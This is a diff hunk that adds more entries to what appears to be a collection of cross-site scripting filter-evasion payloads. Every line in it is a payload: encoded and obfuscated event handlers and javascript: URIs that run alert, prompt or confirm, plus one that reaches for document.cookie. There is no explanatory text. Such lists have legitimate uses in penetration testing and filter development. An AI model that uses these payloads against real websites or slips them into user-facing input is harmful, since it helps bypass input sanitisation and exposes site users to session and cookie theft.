@@ -74,3 +74,17 @@ javascript:eval(atob('d2luZG93LlthbGVydF0oJ1hTUycp'));
 <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
 <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
 <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<--%253cimg%20onerror=alert(1)%20src=a%253e
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<svg onload=alert%26%230000000040"1')>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+On\u01234\load ----> On\u01234\+OnLoAd ----> onload
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+“><img src =q onerror=prompt(8)>
+%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)
+<svg onload=prompt&#0000000040document.domain)> Hex: <svg onload=prompt&#x000000028;document.domain)>
